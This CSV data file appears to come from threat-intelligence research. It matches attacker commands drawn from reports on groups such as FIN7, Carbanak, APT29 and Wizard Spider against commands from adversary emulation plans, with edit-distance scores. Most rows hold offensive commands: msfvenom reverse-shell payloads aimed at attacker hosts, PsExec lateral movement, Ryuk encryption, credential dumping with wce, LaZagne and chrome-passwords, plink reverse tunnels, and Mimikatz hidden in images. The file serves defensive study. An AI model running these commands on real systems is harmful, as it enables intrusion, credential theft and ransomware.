report,file,tool,input_command,matched_command,edit_score,match_found
CROWD_CARBANAK,command_psexec_TA0003_T1133.txt,psexec,psexec \\remote_system -u <username> -p <password> -r <service_name>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,357",True
CROWD_CARBANAK,command_psexec_TA0011_T1105.txt,psexec,"psexec \\<target_computer> -s -h -n 30 -u <attacker_username> -p <attacker_password> cmd /c ""copy C:\path\to\target_file.exe %appdata%\Microsoft\Windows\Downloaded Program Files""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,336",True
CROWD_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
CROWD_CARBANAK,command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce.exe /dump /ntlm,"```sh
wce.exe -w
```","0,41",True
CROWD_WIZARDSPIDER,command_chrome_passwords_TA0006_T1555.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
CROWD_WIZARDSPIDER,command_metasploit_TA0002_T1035.txt,metasploit,msfpayload windows/xp/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,654",True
CROWD_WIZARDSPIDER,command_metasploit_TA0002_T1059.txt,metasploit,use auxiliary/scanner/smb/smb_login,"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```","0,517",True
CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1018.txt,metasploit,recon info,`sudo msfconsole`,"0,296",True
CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1057.txt,metasploit,code_factory.make_random_stub --type if_statement,`meterpreter > migrate -N mstsc.exe `,"0,233",True
CROWD_WIZARDSPIDER,command_metasploit_TA0007_T1082.txt,metasploit,use powershell mixin; payload_info; osinfo,`meterpreter > load powershell`,"0,329",True
CROWD_WIZARDSPIDER,command_metasploit_TA0011_T1071.txt,metasploit,run http://user:<pass>@<remote_IP>:5985,`meterpreter> getsystem -t 1`,"0,265",True
CROWD_WIZARDSPIDER,command_plink_TA0011_T1105.txt,plink,"plink.exe -i <private_key_file> -ssh user@192.168.0.4 -m ""<command_to_execute>""","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,478",True
CROWD_WIZARDSPIDER,command_psexec_TA0001_T1078.txt,psexec,psexec \\remote-system -u <new-user-name> -p <password> -i,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,32",True
CROWD_WIZARDSPIDER,command_psexec_TA0003_T1078.txt,psexec,psexec \\remote-system -e -u <new_user_name> -p <password> -w C:\directory,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,357",True
CROWD_WIZARDSPIDER,command_psexec_TA0004_T1078.txt,psexec,psexec -u <new_user_name> -p <new_password> //remote-system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,301",True
CROWD_WIZARDSPIDER,command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\Username -p <password> -l,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,347",True
CROWD_WIZARDSPIDER,command_psexec_TA0006_T1003.txt,psexec,"psexec -i -u <Domain\User> -p <password> cmd /c ""whoami""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,332",True
CROWD_WIZARDSPIDER,command_psexec_TA0008_T1021.txt,psexec,"psexec @<list_of_hosts_file> -u <attacker_username> -c ""<path_to_Ryuk_binary>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,286",True
CROWD_WIZARDSPIDER,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe -p <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,63",True
CROWD_WIZARDSPIDER,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --process-name <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,609",True
CYWARE_FIN6,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
CYWARE_FIN6,command_metasploit_TA0002_T1129.txt,metasploit,"msfconsole -x ""use exploit/windows/local/payload_inject; set PAYLOAD=windows/x64/meterpreter/reverse_tcp; set LHOST=<attacker_IP>; set LPORT=<attacker_port>; exploit""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"0,559",True
CYWARE_FIN6,command_metasploit_TA0003_T1543.txt,metasploit,"msfdb -n ""Windows_Service"" -o ""mof"" upload <mof_file>",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"0,337",True
CYWARE_FIN6,command_metasploit_TA0004_T1543.txt,metasploit,msfdb --component db_connect -n <name> -u your_current_account_name -p super_secret_password -t super_secret_api_token,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,268",True
CYWARE_FIN6,command_plink_TA0011_T1105.txt,plink,plink -share <c2_server>,"```sh
plink -ssh #{user}@#{server}
```","0,516",True
CYWARE_FIN6,command_psexec_TA0008_T1021.txt,psexec,psexec -s -u <remote_username> -p <password> -r <remote_service_name> -x,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,31",True
CYWARE_FIN6,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject-lockergoga,`ryuk.exe --encrypt --process-name notepad.exe`,"0,533",True
CYWARE_OILRIG,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
CYWARE_OILRIG,command_metasploit_TA0011_T1071.txt,metasploit,use meterpreter/http,`meterpreter> getsystem -t 1`,"0,531",True
CYWARE_OILRIG,command_paexec_TA0003_T1505.txt,paexec,paexec -i -c <web_server_script_name>.bat," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,207",True
CYWARE_OILRIG,command_plink_TA0001_T1071.txt,plink,plink.exe -share <session_name>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,416",True
CYWARE_OILRIG,command_pupy_TA0001_T1078.txt,pupy,creddump,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,104",True
CYWARE_OILRIG,command_pupy_TA0003_T1078.txt,pupy,run Lazagne,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,135",True
CYWARE_OILRIG,command_pupy_TA0004_T1078.txt,pupy,lazagne -o db -p <local_db_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,228",True
CYWARE_OILRIG,command_pupy_TA0005_T1078.txt,pupy,laze -s,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,118",True
DEEPWATCH_FIN7,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -s <username>:<domain>:<hash>[:<ntlm_hash>],"```sh
wce.exe -w
```","0,149",True
DIVE_WIZARDSPIDER,command_chrome_passwords_TA0003_T1078.txt,chrome passwords,chrome-passwords -p <stolen_credentials>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,371",True
DIVE_WIZARDSPIDER,command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_credentials>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,371",True
DIVE_WIZARDSPIDER,command_ryuk_TA0002_T1059.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"0,417",True
DIVE_WIZARDSPIDER,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","0,462",True
DOJ_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -no-antispoof <attacker_ssh_user>@<command_and_control_server_IP>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,411",True
DOJ_FIN7,command_pupy_TA0001_T1078.txt,pupy,lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","0,105",True
DOJ_FIN7,command_pupy_TA0003_T1078.txt,pupy,hashmon -m <process_memory_path>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,236",True
DOJ_FIN7,command_pupy_TA0004_T1078.txt,pupy,lazagne --all,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,135",True
DOJ_FIN7,command_pupy_TA0005_T1078.txt,pupy,loot_memory -b <browser_name>,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","0,299",True
DOJ_FIN7,command_windows_credential_editor_TA0009_T1005.txt,windows credential editor,wce -n MYDOMAIN -u NETWORK SERVICE -p WORKGROUP,"```sh
wce.exe -w
```","0,149",True
DUKES_APT29,command_metasploit_TA0002_T1059.txt,metasploit,powershell.exe -ExecutionPolicy Bypass -File <script_file_path>,`meterpreter > powershell_execute Get-NetComputer`,"0,336",True
DUKES_APT29,command_metasploit_TA0010_T1041.txt,metasploit,recon/gather/credentials collect_creds,[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,"0,544",True
DUKES_APT29,command_metasploit_TA0011_T1071.txt,metasploit,msfconsole -x 'use exploit/multi/http/download_exec; set PAYLOAD windows/meterpreter/reverse_https; set RHOST <c2_server_ip>; set RPORT 8443; set SSL true; exploit',"```
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_https
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
    ```","0,542",True
DUKES_APT29,command_metasploit_TA0011_T1102.txt,metasploit,curl -o <served_payload_file> https://<c2_server>/linux/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,"0,44",True
DUKES_APT29,command_psexec_TA0002_T1569.txt,psexec,"psexec -s -a 1,2 -c ""C:\Path\To\MaliciousExecutable.exe"" -d","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,23",True
DUKES_APT29,command_psexec_TA0008_T1021.txt,psexec,psexec \\<target_computer_name> -u <username> -p <password> cmd.exe,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","0,359",True
FIREEYE1_CARBANAK,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
FIREEYE1_CARBANAK,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
FIREEYE1_CARBANAK,command_paexec_TA0002_T1204.txt,paexec,"PAExec -program ""<malicious_file_path>"""," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,198",True
FIREEYE1_CARBANAK,command_paexec_TA0011_T1021.txt,paexec,paeexec -c -u <victims_username> -p <attacker_password> -w %windir% -i," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,384",True
FIREEYE1_CARBANAK,command_paexec_TA0011_T1219.txt,paexec,paexec.exe -s -u <user_name> -p <password> -i," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","0,416",True
FIREEYE1_CARBANAK,command_ryuk_TA0005_T1055.txt,ryuk,'ryuk.exe --process-name notepad.exe',`ryuk.exe --encrypt --process-name notepad.exe`,"0,833",True
FIREEYE1_CARBANAK,command_ryuk_TA0006_T1055.txt,ryuk,ryuk.exe --encrypt,`ryuk.exe --encrypt --process-name notepad.exe`,"0,554",True
FIREEYE1_CARBANAK,command_ryuk_TA0009_T1113.txt,ryuk,ryuk.exe /capture-desktop,`ryuk.exe --encrypt --process-name notepad.exe`,"0,472",True
FIREEYE1_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -C -i <private_key_file> <c2_server_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,589",True
FIREEYE2_FIN7,command_adfind_TA0002_T1204.txt,adfind,adfind -jsd xxx -ntsecuritydescriptor -sddl++ -resolvesids <LNK_file_path>,`adfind.exe -f (objectcategory=group) > ad_group.txt`,"0,331",True
FIREEYE3_FIN7,command_chrome_passwords_TA0002_T1204.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
FIREEYE3_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Embed -InputFile <image_file> -OutputFile <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,4",True
FIREEYE3_FIN7,command_metasploit_TA0002_T1059.txt,metasploit,"msfconsole -q; irb; require 'msf/core/exploitation'; require 'msf/util/powershell'; js = ::Rex::Exploitation::JSObfu.new %Q|eval('eval(String.fromCharCode(98,111,100));');|; js.obfuscate",`meterpreter > powershell_execute Get-NetComputer`,"0,246",True
FIREEYE4_FIN7,command_chrome_passwords_TA0006_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
FIREEYE4_FIN7,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,438",True
FIREEYE4_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Command:,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,091",True
FIREEYE4_FIN7,command_plink_TA0008_T1021.txt,plink,plink.exe -load sessname -X -v -R <vnc_port>:localhost:<vnc_port> <attacker_ssh_user>@<target_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","0,45",True
FIREEYE4_FIN7,command_rubeus_TA0009_T1113.txt,rubeus,rubeus logonsession /screenshot,`rubeus.exe kerberoast /domain:oz.local`,"0,282",True
FIREEYE4_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe /inject <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,565",True
FIREEYE4_FIN7,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"0,658",True
FIREEYE5_FIN7,command_adfind_TA0003_T1546.txt,adfind,"adfind -sc adobjcnt:fsp -base CN=Foreign Security Principals,CN=Schema,CN=Configuration","adfind -f ""(objectcategory=group)""`","0,344",True
FIREEYE5_FIN7,command_adfind_TA0004_T1546.txt,adfind,"adfind -b CN=Application Shim Database,CN=Schema,CN=Configuration,DC=example,DC=com -ds -showdel",`adfind.exe -f (objectcategory=person) > ad_users.txt`,"0,293",True
FIREEYE5_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe -c > shim_database_file.sdb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,381",True
FIREEYE5_FIN7,command_invoke_psimage_TA0002_T1106.txt,invoke psimage,Invoke-PSImage -ScriptBlock {RtlDecompressBuffer} -OutputFile,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,525",True
FIREEYE5_FIN7,command_invoke_psimage_TA0003_T1543.txt,invoke psimage,Invoke-PSImage -Script <malicious_payload_script> -Out <new_image_file>.png -Image <existing_image_file>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,511",True
FIREEYE5_FIN7,command_invoke_psimage_TA0004_T1543.txt,invoke psimage,Invoke-PSImage -Script .\T1543.ps1 -Out .\system-process.ps1 -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,579",True
FIREEYE5_FIN7,command_pupy_TA0004_T1055.txt,pupy,gen -f client -O windows -A x64 connect --host <ip>:<port> -t transport,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,617",True
FIREEYE5_FIN7,command_pupy_TA0005_T1055.txt,pupy,gen -f dll connect --host <target_ip>:<port> -t <transport>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"0,4",True
FIREEYE6_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
FIREEYE6_FIN7,command_invoke_psimage_TA0003_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.exe -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,566",True
FIREEYE6_FIN7,command_invoke_psimage_TA0004_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.png -Image .\kiwi.jpg -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,682",True
FIREEYE6_FIN7,command_wmic_TA0007_T1057.txt,wmic,wmic path win32_process get name,"`wmic /node:#{""POS system""} process call create #{""executable""}`","0,417",True
FIREEYE6_FIN7,command_wmic_TA0009_T1018.txt,wmic,"wmic path win32_process get processid, name, executablepath /value","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,431",True
FIREEYE6_FIN7,command_wmic_TA0009_T1082.txt,wmic,"wmic path win32_process get name,processid,caption /format:value","`wmic /node:#{""POS system""} process call create #{""executable""}`","0,375",True
FORCEPOINT_CARBANAK,command_chrome_passwords_TA0011_T1102.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,421",True
FORCEPOINT_CARBANAK,command_plink_TA0002_T1071.txt,plink,"plink.exe -load mysession -o ""POST /path/to/web/protocol"" -v",`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,34",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1071.txt,plink,"plink.exe login.example.com -l fred -v ""POST / HTTP/1.1"" -batch",`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,349",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1105.txt,plink,plink -batch -ssh ggldr@<google_service_url>,"```sh
plink -ssh #{user}@#{server}
```","0,463",True
FORK_APT29,command_chrome_passwords_TA0009_T1114.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_user_data>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","0,333",True
FORK_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -Embed -InputFile ""<obfuscated_script.png>"" -OutputFile ""<output.png>""",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"0,4",True
FORK_APT29,command_metasploit_TA0011_T1102.txt,metasploit,msfconsole -r <task_database_file>,`sudo msfconsole`,"0,392",True
FORK_APT29,command_plink_TA0010_T1048.txt,plink,plink.exe -no-sanitise-stdout -ssh <victim_ssh_user>@<victim_ssh_ip>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,404",True
FORK_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -telnet <CnC_Server_IP> -P <port_number>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"0,375",True
